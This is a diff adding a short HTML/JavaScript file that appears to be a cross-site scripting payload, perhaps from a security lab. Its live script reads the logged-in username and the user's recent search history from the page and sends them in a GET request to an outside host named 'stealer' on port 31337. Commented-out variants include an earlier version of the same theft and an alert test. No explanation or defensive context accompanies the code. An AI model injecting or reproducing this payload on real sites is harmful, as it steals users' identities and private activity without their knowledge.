@@ -1,0 +1,31 @@
+
+<!-- <script>
+    $.ajax({
+        url: "http://stealer:31337/?stolen_user=<username>&last_search=<last_search>",
+        type: 'GET',
+        data: {},
+        success: $(function() {
+            var username = $("#logged-in-user").text();
+            var last_search = document.getElementById('history-list').children[0].nextElementSibling.innerHTML;
+            var url = "http://stealer:31337/?stolen_user=" + username + "&last_search=" + last_search;
+            $.get(url);
+        })
+    });
+</script> -->
+
+
+<script>
+    $(function() {
+        if (0==0){
+            $.get(`http://stealer:31337/?stolen_user=` + $(`#logged-in-user`).text() + `&last_search=` + document.getElementById(`history-list`).children[1].innerHTML)
+        }
+    })
+</script>
+
+<!-- <script>
+    $(function() {
+        if (0==0){
+            alert((`#logged-in-user`).text())
+        }
+    })
+</script> -->
